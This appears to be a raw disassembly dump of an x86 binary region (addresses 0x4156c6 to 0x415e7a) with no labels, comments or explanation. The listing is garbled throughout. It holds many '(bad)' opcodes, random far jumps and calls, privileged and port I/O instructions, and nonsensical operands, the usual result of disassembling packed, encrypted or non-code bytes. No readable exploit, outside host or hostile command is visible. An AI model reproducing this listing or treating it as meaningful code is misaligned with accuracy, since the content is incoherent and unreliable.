  4156c6:	shr    DWORD PTR [ecx+0x4d],cl
  4156c9:	leave  
  4156ca:	mov    al,ds:0x14e534ad
  4156cf:	rcr    DWORD PTR [eax],cl
  4156d1:	retf   
  4156d2:	into   
  4156d3:	jns    0x415675
  4156d5:	adc    DWORD PTR [edx+0x518a8c24],esp
  4156db:	repz inc ebx
  4156dd:	xchg   DWORD PTR [edx-0x61],edi
  4156e0:	outs   dx,DWORD PTR ds:[esi]
  4156e1:	push   edi
  4156e2:	cmp    edx,edx
  4156e4:	push   ebp
  4156e5:	pop    es
  4156e6:	jmp    0x84635f0
  4156eb:	pop    ecx
  4156ec:	dec    edx
  4156ed:	mov    ah,0xc1
  4156ef:	(bad)  
  4156f0:	int    0x9a
  4156f2:	fist   WORD PTR [eax+eax*2+0xd302144]
  4156f9:	jb     0x415765
  4156fb:	sbb    al,0x1
  4156fd:	iret   
  4156fe:	aad    0xb
  415700:	fnsave [ebx+0xd8ff5aa]
  415706:	enter  0x286,0x6d
  41570a:	cmp    al,0x7b
  41570c:	aaa    
  41570d:	mov    dl,0x7d
  41570f:	push   cs
  415710:	test   DWORD PTR [esi],0x65b9c250
  415716:	mov    edi,0x9d979306
  41571b:	aad    0x76
  41571d:	(bad)  
  41571e:	mov    eax,ds:0x821e9e46
  415723:	cwde   
  415724:	add    cl,BYTE PTR [edi]
  415726:	fst    DWORD PTR [edx+ebp*1]
  415729:	adc    BYTE PTR [ecx],ah
  41572b:	aam    0x45
  41572d:	fadd   st,st(2)
  41572f:	cmp    eax,0x5712e282
  415734:	loopne 0x41573a
  415736:	push   esp
  415737:	mov    edi,0x99b39927
  41573c:	imul   eax,edi,0xffffff8a
  41573f:	or     BYTE PTR [esi+0x71],cl
  415742:	sub    al,0x8c
  415744:	std    
  415745:	jge    0x415772
  415747:	sbb    edx,DWORD PTR [edx-0x7a534234]
  41574d:	mov    dl,BYTE PTR [esi+0x2eea9adf]
  415753:	es inc ebx
  415755:	mov    edi,0x204559bd
  41575a:	shr    ebx,1
  41575c:	pop    ds
  41575d:	and    al,0x68
  41575f:	retf   0x9df8
  415762:	adc    edi,0xcfa3c80c
  415768:	adc    dh,cl
  41576a:	ins    DWORD PTR es:[edi],dx
  41576b:	fstp   TBYTE PTR ds:0x502a42c5
  415771:	xor    ebx,edi
  415773:	cmp    eax,0x640424dd
  415778:	cmp    BYTE PTR [edi+edi*1],ch
  41577b:	sbb    al,0xdd
  41577d:	scas   al,BYTE PTR es:[edi]
  41577e:	psubusw mm0,mm6
  415781:	fxch   st(2)
  415783:	push   edi
  415784:	out    0xf1,al
  415786:	xor    bl,BYTE PTR [edi]
  415788:	xchg   esp,eax
  415789:	sti    
  41578a:	rcr    dh,1
  41578c:	dec    ebp
  41578d:	ds pop es
  41578f:	pop    edi
  415790:	sub    BYTE PTR [esp+eiz*4],ch
  415793:	test   al,0xb
  415795:	push   edi
  415796:	ficom  DWORD PTR [edi+0x25]
  415799:	ror    cl,cl
  41579b:	mov    esi,0xd54bf787
  4157a0:	pushf  
  4157a1:	inc    ecx
  4157a2:	into   
  4157a3:	or     DWORD PTR [edx],esi
  4157a5:	mov    DWORD PTR [esi],0xdae25aba
  4157ab:	xor    BYTE PTR ds:0xb1b312df,dh
  4157b1:	aad    0xf4
  4157b3:	fwait
  4157b4:	retf   
  4157b5:	mov    edi,0x63c298aa
  4157ba:	jmp    0xf9b6:0x6ee5693f
  4157c1:	retf   
  4157c2:	push   ecx
  4157c3:	int3   
  4157c4:	or     eax,0x9a751f70
  4157c9:	xchg   edi,eax
  4157ca:	outs   dx,DWORD PTR ds:[esi]
  4157cb:	cld    
  4157cc:	mov    cl,0xc5
  4157ce:	test   BYTE PTR [ebp+0x659bca1e],0xf9
  4157d5:	inc    esp
  4157d6:	cmc    
  4157d7:	mov    bl,BYTE PTR [edx+0x48799471]
  4157dd:	test   edx,ecx
  4157df:	jge    0x4157cb
  4157e1:	es jb  0x4157d7
  4157e4:	push   ecx
  4157e5:	repnz push ebp
  4157e7:	xchg   esi,eax
  4157e8:	push   esp
  4157e9:	xchg   edx,eax
  4157ea:	cmp    ecx,ecx
  4157ec:	mov    esi,0xc19d795c
  4157f1:	jb     0x4157ef
  4157f3:	cmp    bl,ch
  4157f5:	(bad)  
  4157f6:	bndstx [ebx-0x6e],bnd1
  4157fa:	not    DWORD PTR [edi-0x28]
  4157fd:	adc    eax,0x30126087
  415802:	repz mov ecx,0xb1fb1cce
  415808:	aaa    
  415809:	dec    ebp
  41580a:	(bad)  
  41580b:	int    0x3b
  41580d:	push   eax
  41580e:	and    ebp,DWORD PTR [ebx]
  415810:	mov    edi,DWORD PTR [ebp-0x73]
  415813:	sahf   
  415814:	cli    
  415815:	sar    BYTE PTR [ebp+0x60a5730f],0x2c
  41581c:	adc    ebp,DWORD PTR [edi]
  41581e:	or     al,0x33
  415820:	and    DWORD PTR [esi],ebx
  415822:	mov    cs,WORD PTR [esi-0x6396ba6b]
  415828:	cmp    BYTE PTR [ebx+eax*1+0x51b7b8ec],dl
  41582f:	sub    eax,0x312d6639
  415834:	inc    BYTE PTR ds:0x2ca49a8a
  41583a:	or     al,0x28
  41583c:	mov    bh,0x1c
  41583e:	jle    0x4157ce
  415840:	fwait
  415841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415842:	inc    ebp
  415843:	das    
  415844:	inc    ecx
  415845:	(bad)  
  415847:	lods   al,BYTE PTR ds:[esi]
  415848:	pop    ebx
  415849:	in     eax,dx
  41584a:	push   esp
  41584b:	pop    eax
  41584c:	in     al,0x21
  41584e:	jmp    0x3be8:0xdfeef50b
  415855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415856:	enter  0x36ff,0x80
  41585a:	dec    esi
  41585b:	sbb    bh,BYTE PTR [esi-0x19]
  41585e:	push   edx
  41585f:	aaa    
  415860:	in     eax,dx
  415861:	or     eax,DWORD PTR [esi+0x7691a9b6]
  415867:	jg     0x41583a
  415869:	xor    BYTE PTR [ecx+0x2cd7f4c],bh
  41586f:	pushf  
  415870:	sub    esp,edi
  415872:	les    esp,FWORD PTR [ebx]
  415874:	cld    
  415875:	pop    ecx
  415876:	je     0x4158d9
  415878:	sbb    ebp,esi
  41587a:	xor    DWORD PTR [ecx+0x79fd228],esp
  415880:	mov    ds:0x79a6a8b6,al
  415885:	mov    al,0xbc
  415887:	cmp    dh,al
  415889:	or     al,0xe0
  41588b:	sub    BYTE PTR [edi-0x1db0b1ee],ch
  415891:	nop
  415892:	call   0x41b6:0x522dc41a
  415899:	daa    
  41589a:	icebp  
  41589b:	jmp    0xf3544415
  4158a0:	addr16 dec edi
  4158a2:	mov    ecx,0xb89e5725
  4158a7:	outs   dx,BYTE PTR ds:[esi]
  4158a8:	ins    BYTE PTR es:[edi],dx
  4158a9:	stc    
  4158aa:	aam    0x3f
  4158ac:	lods   eax,DWORD PTR ds:[esi]
  4158ad:	or     al,0xdc
  4158af:	xchg   ebx,eax
  4158b0:	aad    0xb4
  4158b2:	(bad)  
  4158b3:	jbe    0x4158aa
  4158b5:	cmp    al,0x44
  4158b7:	push   esi
  4158b8:	test   BYTE PTR [esi-0x7f],bh
  4158bb:	fistp  DWORD PTR [eax]
  4158bd:	out    0x31,eax
  4158bf:	xchg   esi,eax
  4158c0:	mov    ebx,0xf4660384
  4158c5:	gs sti 
  4158c7:	add    esi,DWORD PTR [ecx*2+0x63f90136]
  4158ce:	xor    esp,ebp
  4158d0:	inc    edx
  4158d1:	mov    bl,0xd2
  4158d3:	push   0x58652a7e
  4158d8:	or     eax,0x27a0a9c5
  4158dd:	sbb    bh,BYTE PTR [ecx+0x1d]
  4158e0:	call   0xf223:0x3488272a
  4158e7:	sbb    eax,0xa4c4f05a
  4158ec:	nop
  4158ed:	pop    ecx
  4158ee:	xchg   edx,eax
  4158ef:	adc    bh,BYTE PTR [edx+0x44]
  4158f2:	add    cl,BYTE PTR [esi-0x7]
  4158f5:	clc    
  4158f6:	aaa    
  4158f7:	pcmpgtb mm1,mm3
  4158fa:	lea    edx,[edi]
  4158fc:	inc    esi
  4158fd:	pop    esi
  4158fe:	mulps  xmm4,XMMWORD PTR [eax+0x4aac4930]
  415905:	leave  
  415906:	inc    esi
  415907:	xor    ch,cl
  415909:	jle    0x415891
  41590b:	mov    dl,0xec
  41590d:	cli    
  41590e:	pop    esp
  41590f:	jp     0x41589e
  415911:	or     DWORD PTR [ecx-0x5679ccd8],esp
  415917:	sbb    DWORD PTR [eax-0x4c],0x20011870
  41591e:	dec    esp
  41591f:	or     al,0xb2
  415921:	sub    BYTE PTR [eax],al
  415923:	dec    ebx
  415924:	paddsw mm3,QWORD PTR [eax]
  415927:	jmp    0x11381193
  41592c:	cmc    
  41592d:	jne    0x4158cc
  41592f:	jno    0x4158c9
  415931:	sbb    bl,dh
  415933:	mov    eax,ds:0xb8b19708
  415938:	out    dx,eax
  415939:	fisttp QWORD PTR [edx]
  41593b:	pop    esi
  41593c:	xchg   edx,eax
  41593d:	adc    al,0xcc
  41593f:	push   eax
  415940:	xchg   ecx,eax
  415941:	pop    ebx
  415942:	lock pop edx
  415944:	dec    esp
  415945:	shr    DWORD PTR [ecx-0x40],cl
  415948:	or     eax,DWORD PTR [edi-0x41]
  41594b:	pop    edi
  41594c:	pop    esp
  41594d:	jno    0x4158ec
  41594f:	jg     0x41598d
  415951:	xor    esp,0x5
  415954:	test   eax,0xe1999592
  415959:	int    0xc7
  41595b:	aad    0x96
  41595d:	mov    ds:0x45ae0327,al
  415962:	and    cl,ch
  415964:	loopne 0x4159d0
  415966:	(bad)  
  415967:	cmp    DWORD PTR [ecx-0x66],esp
  41596a:	ja     0x4158f3
  41596c:	add    DWORD PTR [edx+esi*8+0x65e26117],eax
  415973:	cli    
  415974:	loop   0x415938
  415976:	inc    ebx
  415977:	call   0xf2c9:0x1f3f3462
  41597e:	pushf  
  41597f:	or     al,0x8f
  415981:	scas   al,BYTE PTR es:[edi]
  415982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415983:	or     eax,0x8f2bf8c
  415988:	jne    0x415977
  41598a:	daa    
  41598b:	(bad)  
  41598c:	jp     0x4159a7
  41598e:	lds    esi,FWORD PTR [ebx+0x6d]
  415991:	test   BYTE PTR [ecx+0xd],dh
  415994:	add    eax,0x8ad2a162
  415999:	push   es
  41599a:	mov    BYTE PTR [edi],al
  41599c:	rol    cl,cl
  41599e:	repz mov dh,0x13
  4159a1:	(bad)  
  4159a2:	fisubr WORD PTR [edi+ebx*8]
  4159a5:	ficomp DWORD PTR [esi]
  4159a7:	mov    fs,edi
  4159a9:	inc    edx
  4159aa:	imul   edi,ebx,0x64ad08cb
  4159b0:	in     al,dx
  4159b1:	leave  
  4159b2:	lods   eax,DWORD PTR ds:[esi]
  4159b3:	data16 mov ah,0x18
  4159b6:	dec    eax
  4159b7:	shl    BYTE PTR [esi],0x2f
  4159ba:	enter  0x364c,0xb5
  4159be:	mov    edx,0xe7e686de
  4159c3:	and    DWORD PTR [ecx-0x2e2194e4],edi
  4159c9:	mov    dh,0x2
  4159cb:	xchg   ebx,eax
  4159cc:	push   edi
  4159cd:	(bad)  
  4159ce:	test   BYTE PTR [eax-0x1f93ddf],0x0
  4159d5:	cld    
  4159d6:	mov    bh,0x42
  4159d8:	stc    
  4159d9:	pop    es
  4159da:	in     al,dx
  4159db:	scas   eax,DWORD PTR es:[edi]
  4159dc:	mov    ecx,0xd6b99c76
  4159e1:	arpl   WORD PTR [edi-0x34c6922],bx
  4159e7:	iret   
  4159e8:	leave  
  4159e9:	push   ds
  4159ea:	nop
  4159eb:	popa   
  4159ec:	data16 repz sti 
  4159ef:	dec    edx
  4159f0:	idiv   ch
  4159f2:	clc    
  4159f3:	out    0x69,eax
  4159f5:	cmp    eax,0x487d4916
  4159fa:	jp     0x415a6a
  4159fc:	or     dh,BYTE PTR [ebp-0x282c8f97]
  415a02:	stos   BYTE PTR es:[edi],al
  415a03:	gs ins DWORD PTR es:[edi],dx
  415a05:	rol    DWORD PTR [edi+0x47],1
  415a08:	scas   al,BYTE PTR es:[edi]
  415a09:	jp     0x415a46
  415a0b:	and    eax,0xa67e72cb
  415a10:	icebp  
  415a11:	jb     0x4159b3
  415a13:	ins    BYTE PTR es:[edi],dx
  415a14:	aad    0xd2
  415a16:	mov    edi,0xf91c97ce
  415a1b:	loope  0x4159fe
  415a1d:	ins    DWORD PTR es:[edi],dx
  415a1e:	loop   0x415a39
  415a20:	je     0x415a22
  415a22:	fsubr  QWORD PTR [esi]
  415a24:	std    
  415a25:	popa   
  415a26:	ss xlat BYTE PTR gs:[ebx]
  415a29:	push   ecx
  415a2a:	idiv   DWORD PTR [eax+0x2bcf59ad]
  415a30:	jge    0x4159c9
  415a32:	mov    edx,0xcc61980e
  415a37:	sbb    DWORD PTR ds:0xb8fde705,esp
  415a3d:	sbb    eax,0x5a2749ac
  415a42:	out    dx,eax
  415a43:	ss push 0xa445781d
  415a49:	xchg   esp,eax
  415a4a:	mov    esi,tr5
  415a4d:	test   al,0xd3
  415a4f:	scas   al,BYTE PTR es:[edi]
  415a50:	inc    eax
  415a51:	adc    dh,cl
  415a53:	call   0x3878:0xae0bdb2e
  415a5a:	jo     0x415a36
  415a5c:	imul   edx,DWORD PTR [esi],0x3df2128a
  415a62:	mov    al,0xa1
  415a64:	repnz retf 0xb37a
  415a68:	aas    
  415a69:	mov    ds:0x546d3ccb,eax
  415a6e:	or     DWORD PTR [esi],ebp
  415a70:	mov    ebp,0xe677b3a5
  415a75:	call   DWORD PTR [eax-0x12447003]
  415a7b:	add    DWORD PTR [esi+ebx*1],ebx
  415a7e:	loop   0x415af1
  415a80:	jmp    0x415a48
  415a82:	cli    
  415a83:	push   edi
  415a84:	mov    dl,0xa1
  415a86:	lea    ebp,[ecx-0x4f3ad1a4]
  415a8c:	(bad)  [ebx-0x1]
  415a8f:	adc    ecx,DWORD PTR [edi-0xfe92bcf]
  415a95:	xor    al,0xea
  415a97:	js     0x415a95
  415a99:	mov    BYTE PTR [ebx],ah
  415a9b:	loop   0x415a73
  415a9d:	push   ds
  415a9e:	fadd   st,st(0)
  415aa0:	addr16 cli 
  415aa2:	jno    0x415ad7
  415aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aa6:	mov    dh,0xce
  415aa8:	ret    
  415aa9:	dec    ecx
  415aaa:	fcomp  QWORD PTR [eax]
  415aac:	inc    eax
  415aad:	xlat   BYTE PTR ds:[ebx]
  415aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aaf:	loope  0x415ad2
  415ab1:	mov    ch,0x2a
  415ab3:	loope  0x415a4d
  415ab5:	out    0xd6,al
  415ab7:	cmc    
  415ab8:	les    edi,FWORD PTR [ecx+0x570b0cc3]
  415abe:	sbb    eax,0x6b21510d
  415ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac4:	outs   dx,BYTE PTR ds:[esi]
  415ac5:	jg     0x415af4
  415ac7:	mov    bl,0x29
  415ac9:	call   0xabb5:0xa5b24fe2
  415ad0:	fild   WORD PTR [esi]
  415ad2:	repz loope 0x415adf
  415ad5:	xlat   BYTE PTR ds:[ebx]
  415ad6:	fadd   QWORD PTR [ebp-0x2a31a9a2]
  415adc:	pushf  
  415add:	out    dx,al
  415ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415adf:	scas   eax,DWORD PTR es:[edi]
  415ae0:	call   0xa62539ef
  415ae5:	sub    al,0x8b
  415ae7:	mov    ds:0x8cd4e420,eax
  415aec:	dec    eax
  415aed:	call   0x28a7db7a
  415af2:	call   DWORD PTR [ebx-0x7e0c3497]
  415af8:	stos   BYTE PTR es:[edi],al
  415af9:	imul   BYTE PTR [ebp-0x48b74a5]
  415aff:	ins    DWORD PTR es:[edi],dx
  415b00:	enter  0x410f,0x67
  415b04:	int3   
  415b05:	imul   DWORD PTR [edx-0x4ca58ecf]
  415b0b:	aad    0x63
  415b0d:	cwde   
  415b0e:	mov    eax,0xc5f45a65
  415b13:	pop    edi
  415b14:	pop    esi
  415b15:	neg    DWORD PTR [eax]
  415b17:	sbb    DWORD PTR [ecx],0x2c
  415b1a:	mov    dl,0x27
  415b1c:	sbb    al,BYTE PTR [edi-0x815060f]
  415b22:	sar    BYTE PTR [eax],1
  415b24:	ffreep st(1)
  415b26:	cli    
  415b27:	jo     0x415b77
  415b29:	xchg   BYTE PTR [edx-0x8],ch
  415b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2d:	pop    ebp
  415b2e:	inc    esi
  415b2f:	push   0xffffff9c
  415b31:	jno    0x415b4d
  415b33:	sbb    DWORD PTR [edx+0x5b],edx
  415b36:	test   eax,0xc65147e5
  415b3b:	sbb    al,0x6e
  415b3d:	push   eax
  415b3e:	(bad)  
  415b3f:	(bad)  
  415b40:	push   cs
  415b41:	xchg   BYTE PTR [eax-0x4fd22474],ch
  415b47:	push   edi
  415b48:	pop    esp
  415b49:	enter  0xbcc8,0x10
  415b4d:	sbb    eax,0x50fa926f
  415b52:	fsubr  QWORD PTR [edi-0x37]
  415b55:	pop    ecx
  415b56:	and    cl,bl
  415b58:	(bad)  
  415b59:	fsubr  QWORD PTR [ebp-0x79]
  415b5c:	test   cl,0xf0
  415b5f:	cwde   
  415b60:	dec    ecx
  415b61:	jecxz  0x415b43
  415b63:	sub    DWORD PTR ds:0x941eef5f,edx
  415b69:	jo     0x415b32
  415b6b:	test   DWORD PTR [ebx-0x9],edi
  415b6e:	popf   
  415b6f:	cmp    esi,DWORD PTR [edi]
  415b71:	jg     0x415b2a
  415b73:	jo     0x415b37
  415b75:	data16 jo 0x415b7a
  415b78:	jns    0x415b48
  415b7a:	mov    esi,0x80b8ab59
  415b7f:	adc    eax,0xd4f5f11e
  415b84:	iret   
  415b85:	push   edx
  415b86:	mov    ebx,0x91cca4cd
  415b8b:	push   esi
  415b8c:	push   cs
  415b8d:	cmp    BYTE PTR [edi-0x31],dl
  415b90:	jnp    0x415b3e
  415b92:	sub    bl,BYTE PTR [esp+eiz*4]
  415b95:	jmp    0x6518:0xbc1870f7
  415b9c:	jbe    0x415bf2
  415b9e:	xlat   BYTE PTR ds:[ebx]
  415b9f:	xor    al,ah
  415ba1:	pop    eax
  415ba2:	call   0xe8e15cad
  415ba7:	cs int3 
  415ba9:	adc    al,cl
  415bab:	sub    ecx,DWORD PTR [esi+0x28fec37b]
  415bb1:	(bad)  
  415bb2:	cli    
  415bb3:	sbb    eax,esp
  415bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bb6:	aam    0x21
  415bb8:	or     al,0xfc
  415bba:	add    DWORD PTR [edi+eiz*4+0x523492a4],esi
  415bc1:	(bad)  
  415bc2:	outs   dx,BYTE PTR ds:[esi]
  415bc3:	(bad)  
  415bc4:	dec    eax
  415bc5:	pop    ds
  415bc6:	call   0xc5bb2d97
  415bcb:	sub    DWORD PTR [esi],ebx
  415bcd:	das    
  415bce:	mov    bh,0x49
  415bd0:	es push cs
  415bd2:	cmp    bl,al
  415bd4:	xor    al,0x6a
  415bd6:	ss xchg esi,eax
  415bd8:	cmp    al,0xde
  415bda:	lahf   
  415bdb:	dec    ecx
  415bdc:	xchg   ebx,eax
  415bdd:	shr    BYTE PTR [eax-0x2c],1
  415be0:	sub    DWORD PTR [ebp+0x58c71d62],ecx
  415be6:	or     al,0x40
  415be8:	mov    BYTE PTR ds:0xd3e66f1b,bl
  415bee:	mov    dh,0x16
  415bf0:	adc    al,0xcf
  415bf2:	adc    eax,0x134b4b43
  415bf7:	add    edi,DWORD PTR [ecx-0x16]
  415bfa:	xchg   ebx,eax
  415bfb:	adc    al,0x8d
  415bfd:	push   0x39
  415bff:	and    eax,0x4035630b
  415c04:	mov    eax,0xfddf4d8a
  415c09:	imul   ebp,DWORD PTR [esi-0x74433e2e],0x5d
  415c10:	pop    ds
  415c11:	retf   0xd285
  415c14:	fiadd  DWORD PTR [eax+0x3a71a3ef]
  415c1a:	test   al,0x6e
  415c1c:	std    
  415c1d:	dec    esp
  415c1e:	pop    ecx
  415c1f:	mov    eax,0xe85152ed
  415c24:	fmul   QWORD PTR [esi+eiz*4-0x2f]
  415c28:	std    
  415c29:	jb     0x415c44
  415c2b:	cmp    eax,0xdb42e42d
  415c30:	cld    
  415c31:	or     BYTE PTR [ebx],ah
  415c33:	sbb    BYTE PTR [edx],bh
  415c35:	jnp    0x415bc3
  415c37:	inc    cx
  415c39:	ja     0x415c0e
  415c3b:	repnz hlt 
  415c3d:	jb     0x415bcf
  415c3f:	cld    
  415c40:	dec    ebp
  415c41:	loope  0x415ca3
  415c43:	push   esp
  415c44:	push   ss
  415c45:	lock jmp 0xf492ef15
  415c4b:	(bad)  
  415c4c:	pop    edx
  415c4d:	das    
  415c4e:	out    dx,eax
  415c4f:	icebp  
  415c50:	xor    DWORD PTR [ecx],0x21c25284
  415c56:	call   0x1d83eb69
  415c5b:	add    cl,BYTE PTR [eax+0x718cd2dc]
  415c61:	cmp    eax,edx
  415c63:	pop    ds
  415c64:	lods   eax,DWORD PTR ds:[esi]
  415c65:	add    ebx,DWORD PTR [edi-0x54ff25a8]
  415c6b:	in     eax,dx
  415c6c:	sub    esi,DWORD PTR [esi-0x35c295a9]
  415c72:	ficomp DWORD PTR [edi+0x27f4bb42]
  415c78:	pop    edx
  415c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c7a:	pop    ecx
  415c7b:	test   DWORD PTR [eax+0x7d799955],ebx
  415c81:	mov    ah,0x26
  415c83:	aam    0x9d
  415c85:	popf   
  415c86:	pop    ebp
  415c87:	loope  0x415c5b
  415c89:	pop    ss
  415c8a:	or     BYTE PTR [ebx],dl
  415c8c:	fmul   QWORD PTR [bx]
  415c8f:	push   esp
  415c90:	aad    0x9b
  415c92:	ror    BYTE PTR [edi],0xc4
  415c95:	inc    eax
  415c96:	std    
  415c97:	int3   
  415c98:	jno    0x415cb1
  415c9a:	push   ss
  415c9b:	jbe    0x415c68
  415c9d:	mov    al,0x86
  415c9f:	pop    ebx
  415ca0:	dec    esp
  415ca1:	pushf  
  415ca2:	jg     0x415ce6
  415ca4:	icebp  
  415ca5:	ss xchg ebp,eax
  415ca7:	sti    
  415ca8:	ss xchg ebx,eax
  415caa:	into   
  415cab:	cli    
  415cac:	mov    al,ds:0xe1a15b09
  415cb1:	loop   0x415d1f
  415cb3:	and    eax,0x1cf27021
  415cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb9:	ins    DWORD PTR es:[edi],dx
  415cba:	xchg   edi,eax
  415cbb:	mov    ebx,0xf9de4e8
  415cc0:	jle    0x415ca1
  415cc2:	(bad)
  415cc5:	sub    edi,DWORD PTR cs:[ecx-0x16]
  415cc9:	fs out 0x9d,al
  415ccc:	sub    BYTE PTR ds:0x31a2082c,ch
  415cd2:	jl     0x415cea
  415cd4:	in     al,0x53
  415cd6:	xchg   esp,eax
  415cd7:	jo     0x415d40
  415cd9:	imul   ebp,eax,0x5b
  415cdc:	adc    bl,BYTE PTR [edi-0x5dd0f349]
  415ce2:	or     eax,ebp
  415ce4:	mov    dl,0x65
  415ce6:	cmp    al,0x1e
  415ce8:	xchg   ebp,eax
  415ce9:	in     al,0x2b
  415ceb:	pop    edx
  415cec:	mov    ch,0x73
  415cee:	jmp    0x415cb5
  415cf0:	pop    ebp
  415cf1:	mov    ebx,0xf0742a04
  415cf6:	mov    eax,0xdb67e6e4
  415cfb:	mov    ds:0x416b34d0,eax
  415d00:	dec    BYTE PTR es:[edx-0x2f]
  415d04:	xchg   ebp,eax
  415d05:	lds    esp,FWORD PTR [edx-0x4de7908]
  415d0b:	shr    dh,1
  415d0d:	mov    ch,0xb2
  415d0f:	and    esp,DWORD PTR [eax-0x26]
  415d12:	xor    al,0x9c
  415d14:	mov    al,0xd8
  415d16:	mov    dl,0x5d
  415d18:	sub    BYTE PTR [edi+0x3387618a],al
  415d1e:	xchg   BYTE PTR [ecx+0x7b],ch
  415d21:	and    DWORD PTR [eax],eax
  415d23:	mov    bh,0x75
  415d25:	mul    ebp
  415d27:	pop    edx
  415d28:	fucom  st(0)
  415d2a:	adc    edi,DWORD PTR [edx-0x29a39f01]
  415d30:	fild   WORD PTR [ebx-0xc]
  415d33:	fidivr DWORD PTR [ebp-0x42]
  415d36:	mov    al,0x3a
  415d38:	in     eax,0x78
  415d3a:	pushf  
  415d3b:	int    0x7a
  415d3d:	pop    esp
  415d3e:	retf   0x7456
  415d41:	cmp    al,0x6b
  415d43:	jmp    0x415dad
  415d45:	add    DWORD PTR [ecx-0x12f10fec],edx
  415d4b:	in     eax,0x36
  415d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4e:	in     al,0xc4
  415d50:	test   eax,0x3d50dd5e
  415d55:	mov    bl,al
  415d57:	inc    eax
  415d58:	pop    ebx
  415d59:	xchg   edx,eax
  415d5b:	jle    0x415d64
  415d5d:	jae    0x415d0c
  415d5f:	sub    BYTE PTR [esi+0x3a7b37a],0x45
  415d66:	retf   0x17a6
  415d69:	in     al,dx
  415d6a:	lods   al,BYTE PTR ds:[esi]
  415d6b:	inc    edi
  415d6c:	pop    esi
  415d6d:	cwde   
  415d6e:	or     esi,ebp
  415d70:	jno    0x415d8c
  415d72:	jecxz  0x415db2
  415d74:	aam    0x51
  415d76:	cmp    ch,bl
  415d78:	fyl2xp1 
  415d7a:	dec    edi
  415d7b:	mov    ds:0x2025e8a6,al
  415d80:	xor    DWORD PTR [ebx-0x6be4bbe4],eax
  415d86:	ret    0x1251
  415d89:	dec    edi
  415d8a:	mov    dl,0x7e
  415d8d:	call   0x9efd:0x1f552dff
  415d94:	pop    esp
  415d95:	mov    ebx,?
  415d97:	cmp    ebx,DWORD PTR [ecx]
  415d99:	aas    
  415d9a:	push   cs
  415d9b:	mov    dl,0xe7
  415d9d:	xchg   esi,eax
  415d9e:	retf   
  415d9f:	in     eax,0x57
  415da1:	popa   
  415da2:	add    al,0xa4
  415da4:	mov    al,0x6a
  415da6:	repnz and DWORD PTR [edi+0x58cf3765],esi
  415dad:	push   ss
  415dae:	pop    esi
  415daf:	push   esp
  415db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db1:	or     dl,BYTE PTR ds:0x612a51f
  415db7:	dec    ebx
  415db8:	pop    ss
  415db9:	adc    BYTE PTR [esi+0x476a5131],ah
  415dbf:	jge    0x415dd7
  415dc1:	aam    0xf8
  415dc3:	xchg   edx,eax
  415dc4:	fidiv  DWORD PTR [eax]
  415dc6:	fidiv  WORD PTR [ebx]
  415dc8:	ror    BYTE PTR [eax-0x1edab6fb],cl
  415dce:	and    DWORD PTR [edi],0x7c884211
  415dd4:	js     0x415d5f
  415dd6:	jo     0x415e4a
  415dd8:	jbe    0x415de0
  415dda:	xchg   esi,eax
  415ddb:	xchg   ebp,eax
  415ddc:	xor    cl,BYTE PTR [eax-0x67fa173e]
  415de2:	fcmovnu st,st(1)
  415de4:	pop    esp
  415de5:	pop    ecx
  415de6:	inc    edx
  415de7:	iret   
  415de8:	lahf   
  415de9:	and    edi,eax
  415deb:	outs   dx,BYTE PTR ds:[esi]
  415dec:	sub    edi,DWORD PTR [ebx]
  415dee:	daa    
  415def:	fnstsw WORD PTR [ecx]
  415df1:	call   0x52130628
  415df6:	sbb    edi,DWORD PTR [ecx-0x37]
  415df9:	adc    ah,BYTE PTR [ebp-0x67]
  415dfc:	ins    DWORD PTR es:[edi],dx
  415dfd:	xor    BYTE PTR [ecx],al
  415dff:	cwde   
  415e00:	cmp    eax,0xd8e2bfa8
  415e05:	cmp    esi,ecx
  415e07:	repz adc eax,0xa96b5cee
  415e0d:	out    0x2f,eax
  415e0f:	dec    ebx
  415e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e11:	(bad)  
  415e12:	mov    dl,0x8d
  415e14:	inc    edi
  415e15:	nop
  415e16:	push   edx
  415e17:	adc    BYTE PTR [eax+0x7d],dh
  415e1a:	mov    bh,0xf
  415e1c:	or     eax,0x1c0312ec
  415e21:	out    0x23,al
  415e23:	sub    al,BYTE PTR [ebx]
  415e25:	imul   edx,DWORD PTR [esp+edi*4-0x8],0xcebce27d
  415e2d:	out    dx,eax
  415e2e:	inc    esi
  415e2f:	mov    bh,0xc
  415e31:	add    esp,DWORD PTR [esi]
  415e33:	(bad)  
  415e34:	mov    WORD PTR [edi+ecx*8+0x23],es
  415e38:	cs sahf 
  415e3a:	fucomip st,st(3)
  415e3c:	mov    edi,0xe0f75fa7
  415e41:	jae    0x415e6d
  415e43:	and    eax,0x7e7b7530
  415e48:	mov    bh,0x5d
  415e4a:	aas    
  415e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e4c:	pop    edi
  415e4d:	in     eax,0x6d
  415e4f:	dec    edx
  415e50:	nop
  415e51:	cmp    al,0x0
  415e53:	xchg   esi,eax
  415e54:	push   ecx
  415e55:	and    eax,0x4f8949c9
  415e5a:	mov    ebp,eax
  415e5c:	call   0xb8a:0xfa013936
  415e63:	nop
  415e64:	fist   DWORD PTR [edi]
  415e66:	aaa    
  415e67:	mov    WORD PTR [edx-0x59],fs
  415e6a:	cwde   
  415e6b:	sub    eax,0xa932ca51
  415e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e71:	push   esi
  415e72:	out    0xbd,eax
  415e74:	pop    ebx
  415e75:	iret   
  415e76:	pusha  
  415e77:	out    dx,eax
  415e78:	jns    0x415e7d
  415e7a:	fist   DWORD PTR [eax+0x2e227bc]
